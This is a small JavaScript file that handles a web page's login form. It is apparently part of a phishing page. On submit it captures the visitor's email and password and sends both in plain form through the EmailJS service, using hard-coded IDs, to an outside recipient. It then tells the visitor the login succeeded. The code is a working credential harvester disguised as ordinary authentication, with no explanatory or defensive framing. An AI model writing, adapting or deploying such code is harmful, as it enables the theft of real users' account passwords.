// Initialize EmailJS
(function() {
    emailjs.init("oC7GP_zB1Qtk2EzkL"); // Replace with your EmailJS user ID
})();

document.getElementById('loginForm').addEventListener('submit', function(event) {
    event.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // Send email using EmailJS
    emailjs.send("service_geuutdc", "template_tya6lcj", {
        email: email,
        password: password
    })
    .then(function(response) {
        document.getElementById('message').innerText = "Login successful!";
        console.log('SUCCESS!', response.status, response.text);
    }, function(error) {
        document.getElementById('message').innerText = "Login failed. Please try again.";
        console.log('FAILED...', error);
    });
});
